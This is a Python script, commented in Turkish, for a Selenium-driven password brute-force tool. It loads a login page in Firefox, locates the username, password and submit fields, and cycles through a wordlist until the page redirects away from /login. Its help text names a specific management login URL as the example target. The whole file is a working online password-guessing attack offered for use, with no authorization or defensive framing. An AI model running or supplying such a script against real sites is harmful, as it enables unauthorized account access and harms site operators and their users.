import argparse
import sys
import time
from selenium import webdriver
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.firefox import GeckoDriverManager

def main():
    parser = argparse.ArgumentParser(description='Gelişmiş Selenium tabanlı görsel bruteforce aracı.')
    parser.add_argument('url', help='Hedef web sitesinin URL\'si (örn: https://mgmt.yenihavale.net/login)')
    parser.add_argument('-u', '--username', required=True, help='Kullanılacak kullanıcı adı.')
    parser.add_argument('-w', '--wordlist', required=True, help='Denenecek şifrelerin bulunduğu dosya.')

    args = parser.parse_args()

    print(f"[*] Hedef: {args.url}")
    print(f"[*] Kullanıcı Adı: {args.username}")
    print(f"[*] Şifre Listesi: {args.wordlist}")
    print("[*] Tarayıcı başlatılıyor...")

    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"Hata: '{args.wordlist}' kelime listesi dosyası bulunamadı.", file=sys.stderr)
        sys.exit(1)

    service = None
    driver = None
    try:
        service = FirefoxService(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=service)
    except Exception as e:
        print(f"WebDriver başlatılırken bir hata oluştu: {e}", file=sys.stderr)
        print("Lütfen Firefox tarayıcısının sisteminizde kurulu olduğundan emin olun.", file=sys.stderr)
        sys.exit(1)

    try:
        driver.get(args.url)
        print("[*] Sayfa yüklendi. Başlangıç animasyonları için 30 saniye bekleniyor...")
        time.sleep(30)
        print("[*] Bekleme tamamlandı. Denemeler başlıyor.")
    except Exception as e:
        print(f"Hedef URL yüklenirken hata oluştu: {e}", file=sys.stderr)
        driver.quit()
        sys.exit(1)

    found_password = None
    try:
        # --- YENİ VE DAHA AKILLI SEÇİCİ MANTIĞI ---
        wait = WebDriverWait(driver, 15)
        
        # 1. Şifre alanını bul (en güvenilir olan)
        PASSWORD_SELECTOR = (By.CSS_SELECTOR, "input[type='password']")
        password_field = wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
        
        # 2. Kullanıcı adı alanını bul (genellikle şifreden önceki input)
        # XPath kullanarak şifre alanından önce gelen input'u buluyoruz.
        USERNAME_SELECTOR = (By.XPATH, "//input[@type='password']/preceding::input[1]")
        username_field = wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
        
        # 3. Giriş yap butonunu bul
        LOGIN_BUTTON_SELECTOR = (By.CSS_SELECTOR, "button[type='submit']")
        login_button = wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
        
        username_field.send_keys(args.username)

    except TimeoutException:
        print("\nHata: Giriş formundaki elementler bulunamadı.", file=sys.stderr)
        print("Bu durum, sayfanın HTML yapısının beklenenden farklı olmasından kaynaklanabilir.", file=sys.stderr)
        driver.quit()
        sys.exit(1)

    for password in passwords:
        if found_password:
            break
        
        try:
            print(f"[*] Denenen şifre: {password}", end='\r')
            
            password_field.clear()
            password_field.send_keys(password)
            login_button.click()
            
            WebDriverWait(driver, 3).until(lambda d: "/login" not in d.current_url)
            
            current_url = driver.current_url
            print(f"\n[+] BAŞARILI! Şifre bulundu: {password}")
            print(f"    -> Yönlendirilen URL: {current_url}")
            found_password = password
            print("Tarayıcı 30 saniye sonra kapanacak...")
            time.sleep(30)
            break

        except TimeoutException:
            continue
        except Exception as e:
            print(f"\nBeklenmedik bir hata oluştu: {e}")
            break

    if not found_password:
        print("\n[-] Şifre bulunamadı.")

    driver.quit()
    print("[*] Araç kapatıldı.")

if __name__ == '__main__':
    main() 